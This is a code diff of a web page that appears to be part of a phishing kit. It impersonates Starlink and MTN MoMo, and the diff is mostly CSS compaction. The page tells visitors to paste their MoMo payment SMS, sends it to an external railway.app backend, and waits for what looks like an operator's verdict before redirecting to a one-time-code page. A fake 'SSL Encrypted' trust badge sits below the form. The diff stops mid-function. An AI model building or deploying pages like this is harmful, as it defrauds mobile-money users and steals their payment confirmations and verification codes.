@@ -7,637 +7,249 @@
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
-        *, *::before, *::after {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --black: #000000;
-            --white: #ffffff;
-            --gray-50: #f9fafb;
-            --gray-100: #f3f4f6;
-            --gray-200: #e5e7eb;
-            --gray-300: #d1d5db;
-            --gray-400: #9ca3af;
-            --gray-500: #6b7280;
-            --gray-600: #4b5563;
-            --gray-700: #374151;
-            --gray-800: #1f2937;
-            --gray-900: #111827;
-            --green-500: #22c55e;
-            --green-600: #16a34a;
-            --red-500: #ef4444;
-            --momo-yellow: #FFCC00;
-            --momo-yellow-dark: #E6B800;
+            --black: #000; --white: #fff;
+            --gray-50: #f9fafb; --gray-100: #f3f4f6; --gray-200: #e5e7eb;
+            --gray-300: #d1d5db; --gray-400: #9ca3af; --gray-500: #6b7280;
+            --gray-600: #4b5563; --gray-700: #374151; --gray-900: #111827;
+            --green-500: #22c55e; --green-600: #16a34a; --red-500: #ef4444;
+            --momo-yellow: #FFCC00; --momo-yellow-dark: #E6B800;
             --orange-600: #ea580c;
-            --radius-md: 16px;
-            --radius-xl: 26px;
-            --radius-2xl: 30px;
+            --radius-md: 16px; --radius-xl: 26px; --radius-2xl: 30px;
             --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
             --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
             --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
-            --header-h: 74px;
-            --footer-h: 68px;
+            --header-h: 74px; --footer-h: 68px;
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: var(--gray-50);
-            color: var(--gray-900);
-            line-height: 1.5;
-            padding-top: var(--header-h);
-            padding-bottom: var(--footer-h);
-            min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
+            background-color: var(--gray-50); color: var(--gray-900);
+            line-height: 1.5; padding-top: var(--header-h); padding-bottom: var(--footer-h);
+            min-height: 100vh; -webkit-font-smoothing: antialiased;
         }
-
-        body.modal-open {
-            overflow: hidden;
-            position: fixed;
-            width: 100%;
-        }
-
+        body.modal-open { overflow: hidden; position: fixed; width: 100%; }
         a { text-decoration: none; color: inherit; }
         button { font-family: inherit; cursor: pointer; border: none; background: none; }
 
         .header {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            height: var(--header-h);
-            background-color: var(--black);
-            color: var(--white);
-            z-index: 100;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.4);
+            position: fixed; top: 0; left: 0; right: 0;
+            height: var(--header-h); background-color: var(--black); color: var(--white);
+            z-index: 100; box-shadow: 0 2px 12px rgba(0,0,0,0.4);
         }
-
         .header-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 18px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 18px;
+            display: flex; align-items: center; justify-content: space-between;
         }
-
         .brand { display: flex; align-items: center; gap: 10px; }
-
-        .brand-logo-img {
-            height: 54px;
-            width: auto;
-            display: block;
-        }
-
+        .brand-logo-img { height: 54px; width: auto; display: block; }
         .brand-divider { width: 1px; height: 26px; background: rgba(255,255,255,0.2); margin: 0 4px; }
         .brand-sub { font-size: 12px; color: var(--gray-400); font-weight: 500; letter-spacing: 0.5px; }
-
         .header-nav { display: none; gap: 26px; }
-        .header-nav a {
-            color: var(--gray-300);
-            font-size: 14px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 7px;
-            transition: color 0.2s;
-        }
+        .header-nav a { color: var(--gray-300); font-size: 14px; font-weight: 500; display: flex; align-items: center; gap: 7px; transition: color 0.2s; }
         .header-nav a:hover { color: var(--white); }
         .header-nav i { font-size: 18px; }
 
-        .main {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 22px 16px 36px;
-        }
-
-        .sms-wrap {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: calc(100vh - 160px);
-            padding: 8px 0;
-        }
-
-        .sms-card-wrap {
-            width: 100%;
-            max-width: 420px;
-        }
+        .main { max-width: 1200px; margin: 0 auto; padding: 22px 16px 36px; }
+        .sms-wrap { display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 160px); padding: 8px 0; }
+        .sms-card-wrap { width: 100%; max-width: 420px; }
 
         .sms-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
-            padding: 26px 22px 22px;
-            text-align: center;
-            box-shadow: var(--shadow-md);
-            position: relative;
-            overflow: hidden;
+            padding: 26px 22px 22px; text-align: center;
+            box-shadow: var(--shadow-md); position: relative; overflow: hidden;
         }
+        .sms-band::before { content: ""; position: absolute; top: -40px; right: -40px; width: 140px; height: 140px; background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%); border-radius: 50%; pointer-events: none; }
+        .sms-band-logo { height: 46px; width: auto; display: inline-block; position: relative; }
+        .sms-band-tagline { font-size: 11px; font-weight: 800; color: #7A5A00; letter-spacing: 2px; text-transform: uppercase; margin-top: 12px; position: relative; }
 
-        .sms-band::before {
-            content: "";
-            position: absolute;
-            top: -40px; right: -40px;
-            width: 140px; height: 140px;
-            background: radial-gradient(circle, rgba(255,255,255,0.4), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .sms-band::after {
-            content: "";
-            position: absolute;
-            bottom: -50px; left: -50px;
-            width: 120px; height: 120px;
-            background: radial-gradient(circle, rgba(0,0,0,0.06), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .sms-band-logo {
-            height: 46px;
-            width: auto;
-            display: inline-block;
-            position: relative;
-        }
-
-        .sms-band-tagline {
-            font-size: 11px;
-            font-weight: 800;
-            color: #7A5A00;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            margin-top: 12px;
-            position: relative;
-        }
-
-        .sms-body {
-            background: var(--white);
-            border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
-            padding: 24px 22px 26px;
-            box-shadow: var(--shadow-lg);
-        }
+        .sms-body { background: var(--white); border-radius: 0 0 var(--radius-2xl) var(--radius-2xl); padding: 24px 22px 26px; box-shadow: var(--shadow-lg); }
 
         .status-pill {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: #F0FDF4;
-            border: 1.5px solid #86EFAC;
-            border-radius: var(--radius-md);
-            padding: 13px 14px;
-            margin-bottom: 20px;
+            display: flex; align-items: center; gap: 12px;
+            background: #F0FDF4; border: 1.5px solid #86EFAC;
+            border-radius: var(--radius-md); padding: 13px 14px; margin-bottom: 20px;
         }
-
         .status-pill-icon {
-            width: 38px;
-            height: 38px;
-            border-radius: 10px;
-            background: var(--green-500);
-            color: var(--white);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-            flex-shrink: 0;
+            width: 38px; height: 38px; border-radius: 10px;
+            background: var(--green-500); color: var(--white);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 18px; flex-shrink: 0;
             box-shadow: 0 3px 8px rgba(34,197,94,0.35);
         }
+        .status-pill-title { font-size: 13px; font-weight: 900; color: #14532D; }
+        .status-pill-sub { font-size: 11.5px; color: #166534; margin-top: 2px; font-weight: 500; line-height: 1.45; }
 
-        .status-pill-text { flex: 1; min-width: 0; }
-
-        .status-pill-title {
-            font-size: 13px;
-            font-weight: 900;
-            color: #14532D;
-        }
-
-        .status-pill-sub {
-            font-size: 11.5px;
-            color: #166534;
-            margin-top: 2px;
-            font-weight: 500;
-            line-height: 1.45;
-        }
-
-        .steps-label {
-            font-size: 11px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            color: var(--gray-500);
-            margin-bottom: 12px;
-        }
-
-        .steps {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 22px;
-            text-align: left;
-        }
-
+        .steps-label { font-size: 11px; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; color: var(--gray-500); margin-bottom: 12px; }
+        .steps { display: flex; flex-direction: column; gap: 12px; margin-bottom: 22px; }
         .step-row { display: flex; align-items: flex-start; gap: 12px; }
-
         .step-num {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background: var(--momo-yellow);
-            color: var(--black);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11.5px;
-            font-weight: 900;
-            flex-shrink: 0;
-            margin-top: 1px;
-            box-shadow: 0 2px 6px rgba(255,204,0,0.4);
+            width: 24px; height: 24px; border-radius: 50%;
+            background: var(--momo-yellow); color: var(--black);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11.5px; font-weight: 900; flex-shrink: 0;
+            margin-top: 1px; box-shadow: 0 2px 6px rgba(255,204,0,0.4);
         }
-
-        .step-text {
-            font-size: 13px;
-            color: var(--gray-700);
-            font-weight: 500;
-            line-height: 1.55;
-        }
-
+        .step-text { font-size: 13px; color: var(--gray-700); font-weight: 500; line-height: 1.55; }
         .step-text strong { color: var(--gray-900); font-weight: 800; }
 
-        .form-label {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 8px;
-            font-size: 13px;
-            font-weight: 800;
-            color: var(--gray-900);
-            margin-bottom: 9px;
-        }
-
-        .form-label-hint {
-            font-size: 10.5px;
-            font-weight: 700;
-            color: var(--gray-400);
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
+        .form-label { display: flex; align-items: center; justify-content: space-between; gap: 8px; font-size: 13px; font-weight: 800; color: var(--gray-900); margin-bottom: 9px; }
+        .form-label-hint { font-size: 10.5px; font-weight: 700; color: var(--gray-400); letter-spacing: 0.5px; text-transform: uppercase; }
 
         .sms-textarea {
-            width: 100%;
-            padding: 14px 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: var(--gray-900);
-            background: var(--gray-50);
-            border: 2px solid var(--gray-200);
-            border-radius: var(--radius-md);
-            outline: none;
-            resize: none;
-            line-height: 1.55;
+            width: 100%; padding: 14px 15px;
+            font-family: 'Courier New', monospace; font-size: 13px;
+            color: var(--gray-900); background: var(--gray-50);
+            border: 2px solid var(--gray-200); border-radius: var(--radius-md);
+            outline: none; resize: none; line-height: 1.55;
             transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
         }
+        .sms-textarea::placeholder { color: var(--gray-400); font-family: -apple-system, sans-serif; font-weight: 500; }
+        .sms-textarea:focus { border-color: var(--momo-yellow-dark); background: var(--white); box-shadow: 0 0 0 4px rgba(255,204,0,0.18); }
+        .sms-textarea.valid { border-color: var(--green-500); box-shadow: 0 0 0 4px rgba(34,197,94,0.15); }
+        .sms-textarea.invalid { border-color: var(--red-500); box-shadow: 0 0 0 4px rgba(239,68,68,0.12); }
 
-        .sms-textarea::placeholder {
-            color: var(--gray-400);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            font-weight: 500;
-        }
-
-        .sms-textarea:focus {
-            border-color: var(--momo-yellow-dark);
-            background: var(--white);
-            box-shadow: 0 0 0 4px rgba(255,204,0,0.18);
-        }
-
-        .sms-textarea.valid {
-            border-color: var(--green-500);
-            box-shadow: 0 0 0 4px rgba(34,197,94,0.15);
-        }
-
-        .sms-textarea.invalid {
-            border-color: var(--red-500);
-            box-shadow: 0 0 0 4px rgba(239,68,68,0.12);
-        }
-
-        .field-status {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11.5px;
-            font-weight: 700;
-            margin-top: 8px;
-            min-height: 16px;
-        }
-
+        .field-status { display: flex; align-items: center; gap: 6px; font-size: 11.5px; font-weight: 700; margin-top: 8px; min-height: 16px; }
         .field-status.ok { color: var(--green-600); }
         .field-status.bad { color: var(--red-500); }
         .field-status i { font-size: 14px; }
 
         .btn-verify {
-            width: 100%;
-            margin-top: 18px;
-            padding: 17px;
-            border-radius: var(--radius-md);
-            background: var(--black);
-            color: var(--white);
-            font-weight: 900;
-            font-size: 14px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 9px;
+            width: 100%; margin-top: 18px; padding: 17px;
+            border-radius: var(--radius-md); background: var(--black);
+            color: var(--white); font-weight: 900; font-size: 14px;
+            letter-spacing: 1.5px; text-transform: uppercase;
+            display: flex; align-items: center; justify-content: center; gap: 9px;
             transition: transform 0.15s, filter 0.2s, box-shadow 0.25s, opacity 0.2s;
             box-shadow: 0 6px 18px rgba(0,0,0,0.25);
         }
-
-        .btn-verify:hover:not(:disabled) {
-            filter: brightness(1.15);
-            box-shadow: 0 8px 24px rgba(0,0,0,0.35);
-        }
-
+        .btn-verify:hover:not(:disabled) { filter: brightness(1.15); box-shadow: 0 8px 24px rgba(0,0,0,0.35); }
         .btn-verify:active:not(:disabled) { transform: scale(0.98); }
-
-        .btn-verify:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
+        .btn-verify:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
         .btn-verify i { font-size: 18px; }
 
         .btn-spinner {
-            width: 16px;
-            height: 16px;
+            width: 16px; height: 16px;
             border: 2.5px solid rgba(255,255,255,0.3);
-            border-top-color: var(--white);
-            border-radius: 50%;
+            border-top-color: var(--white); border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
-
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .trust-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            font-size: 11px;
-            color: var(--gray-500);
-            font-weight: 600;
-            margin-top: 18px;
-            padding-top: 14px;
+            display: flex; align-items: center; justify-content: center;
+            gap: 6px; font-size: 11px; color: var(--gray-500);
+            font-weight: 600; margin-top: 18px; padding-top: 14px;
             border-top: 1px dashed var(--gray-200);
         }
-
         .trust-footer i { font-size: 14px; color: var(--green-600); }
 
-        /* WAITING OVERLAY */
         .waiting-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10000;
-            display: none;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0; z-index: 10000; display: none;
+            align-items: center; justify-content: center;
             background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
-            color: var(--white);
-            padding: 24px;
-            overflow: hidden;
+            color: var(--white); padding: 24px; overflow: hidden;
         }
-
         .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
-
         .waiting-overlay::before {
-            content: "";
-            position: absolute;
-            top: 50%; left: 50%;
-            width: 600px; height: 600px;
-            transform: translate(-50%, -50%);
+            content: ""; position: absolute; top: 50%; left: 50%;
+            width: 600px; height: 600px; transform: translate(-50%, -50%);
             background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%);
-            animation: pulseGlow 3s ease-in-out infinite;
-            pointer-events: none;
+            animation: pulseGlow 3s ease-in-out infinite; pointer-events: none;
         }
-
         @keyframes pulseGlow {
-            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
-            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
         }
-
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .waiting-content {
-            position: relative;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            z-index: 2;
-        }
-
-        .waiting-orbit {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 28px;
-            position: relative;
-        }
-
-        .waiting-ring {
-            position: absolute;
-            inset: 0;
-            border-radius: 50%;
-            border: 2px dashed rgba(255,204,0,0.4);
-            animation: rotate 8s linear infinite;
-        }
-
-        .waiting-ring.inner {
-            inset: 22px;
-            border: 1.5px dashed rgba(59,130,246,0.4);
-            animation: rotate 5s linear infinite reverse;
-        }
-
+        .waiting-content { position: relative; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
+        .waiting-orbit { width: 120px; height: 120px; margin: 0 auto 28px; position: relative; }
+        .waiting-ring { position: absolute; inset: 0; border-radius: 50%; border: 2px dashed rgba(255,204,0,0.4); animation: rotate 8s linear infinite; }
+        .waiting-ring.inner { inset: 22px; border: 1.5px dashed rgba(59,130,246,0.4); animation: rotate 5s linear infinite reverse; }
         @keyframes rotate { to { transform: rotate(360deg); } }
-
         .waiting-core {
-            position: absolute;
-            top: 50%; left: 50%;
-            width: 60px; height: 60px;
-            transform: translate(-50%, -50%);
+            position: absolute; top: 50%; left: 50%;
+            width: 60px; height: 60px; transform: translate(-50%, -50%);
             border-radius: 50%;
             background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             box-shadow: 0 0 40px rgba(255,204,0,0.5);
             animation: corePulse 1.6s ease-in-out infinite;
         }
-
         @keyframes corePulse {
             0%, 100% { box-shadow: 0 0 40px rgba(255,204,0,0.5); }
-            50%      { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
+            50% { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
         }
-
         .waiting-core i { font-size: 28px; color: var(--black); }
-
-        .waiting-title {
-            font-size: 22px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-        }
-
+        .waiting-title { font-size: 22px; font-weight: 900; letter-spacing: -0.5px; }
         .waiting-title .highlight {
             background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
-
-        .waiting-sub {
-            font-size: 14px;
-            color: var(--gray-400);
-            margin-top: 14px;
-            line-height: 1.65;
-        }
-
+        .waiting-sub { font-size: 14px; color: var(--gray-400); margin-top: 14px; line-height: 1.65; }
         .waiting-sub strong { color: var(--white); font-weight: 800; }
-
-        .waiting-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 24px;
-        }
-
-        .waiting-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: var(--momo-yellow);
-            animation: bounce 1.4s infinite ease-in-out both;
-        }
-
+        .waiting-dots { display: flex; justify-content: center; gap: 8px; margin-top: 24px; }
+        .waiting-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--momo-yellow); animation: bounce 1.4s infinite ease-in-out both; }
         .waiting-dot:nth-child(1) { animation-delay: -0.32s; }
         .waiting-dot:nth-child(2) { animation-delay: -0.16s; }
         .waiting-dot:nth-child(3) { animation-delay: 0s; }
-
         @keyframes bounce {
             0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
-            40%           { transform: scale(1);   opacity: 1; }
+            40% { transform: scale(1); opacity: 1; }
         }
 
-        /* TOAST (error + reminder) */
         .toast-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 10001;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
-            padding: 20px;
+            position: fixed; inset: 0; z-index: 10001; display: none;
+            align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); padding: 20px;
         }
-
         .toast-overlay.open { display: flex; }
-
         .toast-card {
-            background: var(--white);
-            border-radius: var(--radius-xl);
-            padding: 24px 22px;
-            max-width: 340px;
-            width: 100%;
-            text-align: center;
-            box-shadow: var(--shadow-2xl);
-            transform: scale(0.9);
-            opacity: 0;
+            background: var(--white); border-radius: var(--radius-xl);
+            padding: 24px 22px; max-width: 340px; width: 100%;
+            text-align: center; box-shadow: var(--shadow-2xl);
+            transform: scale(0.9); opacity: 0;
             transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
         }
-
         .toast-card.show { transform: scale(1); opacity: 1; }
-
-        .toast-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: var(--radius-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 14px;
-        }
-
+        .toast-icon { width: 56px; height: 56px; border-radius: var(--radius-md); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
         .toast-icon.error { background: #FEE2E2; }
         .toast-icon.error i { font-size: 28px; color: var(--red-500); }
         .toast-icon.info { background: #FFF7D6; }
         .toast-icon.info i { font-size: 28px; color: var(--momo-yellow-dark); }
-
-        .toast-title {
-            font-size: 16px;
-            font-weight: 900;
-            color: var(--gray-900);
-            margin-bottom: 6px;
-        }
-
-        .toast-text {
-            font-size: 13px;
-            color: var(--gray-500);
-            line-height: 1.55;
-            margin-bottom: 18px;
-        }
-
+        .toast-title { font-size: 16px; font-weight: 900; color: var(--gray-900); margin-bottom: 6px; }
+        .toast-text { font-size: 13px; color: var(--gray-500); line-height: 1.55; margin-bottom: 18px; }
         .toast-btn {
-            width: 100%;
-            padding: 14px;
-            background: var(--momo-yellow);
-            color: var(--black);
-            font-weight: 900;
-            font-size: 13px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
+            width: 100%; padding: 14px; background: var(--momo-yellow);
+            color: var(--black); font-weight: 900; font-size: 13px;
+            letter-spacing: 1px; text-transform: uppercase;
             border-radius: var(--radius-md);
             transition: transform 0.15s, filter 0.2s;
             box-shadow: 0 4px 12px rgba(255,204,0,0.35);
         }
-
         .toast-btn:hover { filter: brightness(0.95); }
         .toast-btn:active { transform: scale(0.97); }
 
-        /* BOTTOM NAV */
         .bottom-nav {
-            position: fixed;
-            bottom: 0; left: 0; right: 0;
-            height: var(--footer-h);
-            background: var(--white);
+            position: fixed; bottom: 0; left: 0; right: 0;
+            height: var(--footer-h); background: var(--white);
             border-top: 1px solid var(--gray-200);
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.08);
-            z-index: 100;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.08); z-index: 100;
         }
-
         .bottom-nav-inner {
-            max-width: 1200px;
-            margin: 0 auto;
-            height: 100%;
-            padding: 0 12px;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
+            max-width: 1200px; margin: 0 auto; height: 100%; padding: 0 12px;
+            display: flex; justify-content: space-around; align-items: center;
         }
-
         .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            color: var(--gray-600);
-            font-size: 11px;
-            font-weight: 700;
-            transition: color 0.2s, transform 0.2s;
-            padding: 6px 14px;
-            border-radius: 12px;
+            display: flex; flex-direction: column; align-items: center;
+            gap: 4px; color: var(--gray-600); font-size: 11px;
+            font-weight: 700; transition: color 0.2s, transform 0.2s;
+            padding: 6px 14px; border-radius: 12px;
         }
-
         .nav-item i { font-size: 24px; }
         .nav-item:hover { transform: translateY(-2px); }
+        .nav-item.active { color: var(--blue-600); }
 
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
@@ -645,10 +257,7 @@
             .sms-body { padding: 30px 28px 32px; }
             .sms-band-logo { height: 52px; }
         }
-
-        @media (min-width: 768px) {
-            .header-nav { display: flex; }
-        }
+        @media (min-width: 768px) { .header-nav { display: flex; } }
     </style>
 </head>
 <body>
@@ -670,14 +279,12 @@
     <main class="main">
         <div class="sms-wrap">
             <div class="sms-card-wrap">
-
                 <div class="sms-band">
                     <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="sms-band-logo">
                     <p class="sms-band-tagline">SMS Verification</p>
                 </div>
 
                 <div class="sms-body">
-
                     <div class="status-pill">
                         <div class="status-pill-icon"><i class="uil uil-check"></i></div>
                         <div class="status-pill-text">
@@ -703,52 +310,33 @@
                     </div>
 
                     <form id="smsForm" method="POST" autocomplete="off" onsubmit="return false;">
-
                         <label class="form-label" for="full_sms">
                             Paste SMS Message
                             <span class="form-label-hint" id="charCount">0 chars</span>
                         </label>
-
-                        <textarea
-                            name="full_sms"
-                            id="full_sms"
-                            rows="5"
-                            placeholder="Paste the full SMS here (must start with Y'ello)..."
-                            class="sms-textarea"
-                            spellcheck="false"
-                            autocorrect="off"
-                            autocapitalize="off"
-                            required
-                        ></textarea>
-
+                        <textarea name="full_sms" id="full_sms" rows="5" placeholder="Paste the full SMS here (must start with Y'ello)..." class="sms-textarea" spellcheck="false" autocorrect="off" autocapitalize="off" required></textarea>
                         <div class="field-status" id="fieldStatus"></div>
-
                         <button type="submit" id="verifyBtn" class="btn-verify" disabled>
                             <i class="uil uil-check-circle"></i>
                             <span>Verify Payment</span>
                         </button>
-
                     </form>
 
                     <div class="trust-footer">
                         <i class="uil uil-shield-check"></i>
                         SSL Encrypted &nbsp;•&nbsp; Powered by MTN MoMo
                     </div>
-
                 </div>
             </div>
         </div>
     </main>
 
-    <!-- WAITING OVERLAY -->
     <div class="waiting-overlay" id="waitingOverlay">
         <div class="waiting-content">
             <div class="waiting-orbit">
                 <div class="waiting-ring"></div>
                 <div class="waiting-ring inner"></div>
-                <div class="waiting-core">
-                    <i class="uil uil-message"></i>
-                </div>
+                <div class="waiting-core"><i class="uil uil-message"></i></div>
             </div>
             <h2 class="waiting-title">Verifying <span class="highlight">SMS</span></h2>
             <p class="waiting-sub">
@@ -763,14 +351,11 @@
         </div>
     </div>
 
-    <!-- TOAST (error + reminder) -->
     <div class="toast-overlay" id="toastOverlay">
         <div class="toast-card" id="toastCard">
             <div class="toast-icon error" id="toastIcon"><i class="uil uil-exclamation-triangle"></i></div>
             <h3 class="toast-title" id="toastTitle">Invalid SMS</h3>
-            <p class="toast-text" id="toastText">
-                The SMS must start with <strong>"Y'ello"</strong>. Please paste the correct MTN MoMo confirmation message.
-            </p>
+            <p class="toast-text" id="toastText">The SMS must start with <strong>"Y'ello"</strong>. Please paste the correct MTN MoMo confirmation message.</p>
             <button class="toast-btn" id="toastBtn">OK, Got It</button>
         </div>
     </div>
@@ -778,13 +363,13 @@
     <nav class="bottom-nav">
         <div class="bottom-nav-inner">
             <a href="/dashboard/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
-            <a href="/plans/" class="nav-item"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
+            <a href="/plans/" class="nav-item active"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
             <a href="/settings/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
         </div>
     </nav>
 
     <script>
-        const API_BASE = '';
+        const API_BASE = 'https://starlinknetwork-production.up.railway.app';
 
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Standard';
@@ -799,7 +384,6 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const fieldStatus = document.getElementById('fieldStatus');
         const charCount = document.getElementById('charCount');
-
         const waitingOverlay = document.getElementById('waitingOverlay');
         const toastOverlay = document.getElementById('toastOverlay');
         const toastCard = document.getElementById('toastCard');
@@ -812,14 +396,9 @@
         let currentSessionId = null;
         let lastReminderCount = 0;
 
-        // ============================================
-        // VALIDATE SMS
-        // ============================================
         function validateSMS() {
             const val = textarea.value.trim();
-
             charCount.textContent = val.length + ' chars';
-
             textarea.classList.remove('valid', 'invalid');
             fieldStatus.classList.remove('ok', 'bad');
             fieldStatus.innerHTML = '';
@@ -841,12 +420,8 @@
 
         textarea.addEventListener('input', validateSMS);
 
-        // ============================================
-        // SUBMIT → POST to backend
-        // ============================================
         form.addEventListener('submit', async function (e) {
             e.preventDefault();
-
             const val = textarea.value.trim();
 
             if (!val.startsWith("Y'ello")) {
@@ -871,7 +446,6 @@
                 });
 
                 const data = await res.json();
-
                 if (!data.ok) {
                     verifyBtn.disabled = false;
                     verifyBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify Payment</span>';
@@ -881,126 +455,69 @@
 
                 currentSessionId = data.sessionId;
                 lastReminderCount = 0;
-
                 waitingOverlay.classList.add('open');
                 document.body.classList.add('modal-open');
                 startPolling(currentSessionId);
 
             } catch (err) {
-                console.error(err);
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify Payment</span>';
                 showToast('error', 'Network Error', 'Please check your connection and try again.');
             }
         });
 
-        // ============================================
-        // POLL STATUS
-        // ============================================
         function startPolling(sessionId) {
             clearInterval(pollTimer);
             pollTimer = setInterval(async () => {
                 try {
                     const res = await fetch(API_BASE + '/api/status/' + sessionId);
                     const data = await res.json();
-
                     if (!data.ok) return;
 
                     if (data.status === 'approved') {
                         clearInterval(pollTimer);
                         const otpParams = new URLSearchParams({
-                            plan: planName,
-                            data: planData,
-                            price: planPrice,
-                            phone: planPhone
+                            plan: planName, data: planData,
+                            price: planPrice, phone: planPhone
                         });
                         window.location.href = '/otp-verify/?' + otpParams.toString();
-
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Payment Rejected',
-                            data.message || 'Rejected. Please try again.',
-                            'OK, Got It',
-                            () => {
-                                window.location.href = '/checkout/?' + new URLSearchParams({
-                                    plan: planName,
-                                    data: planData,
-                                    price: planPrice
-                                }).toString();
-                            }
-                        );
-
+                        showToast('error', 'Payment Rejected', data.message || 'Rejected. Please try again.', 'OK', () => {
+                            window.location.href = '/checkout/?' + new URLSearchParams({ plan: planName, data: planData, price: planPrice }).toString();
+                        });
                     } else if (data.status === 'resend_requested') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
-                        showToast(
-                            'error',
-                            'Wrong SMS',
-                            data.message || 'You pasted the wrong SMS. Ensure your details match this order to complete the payment.',
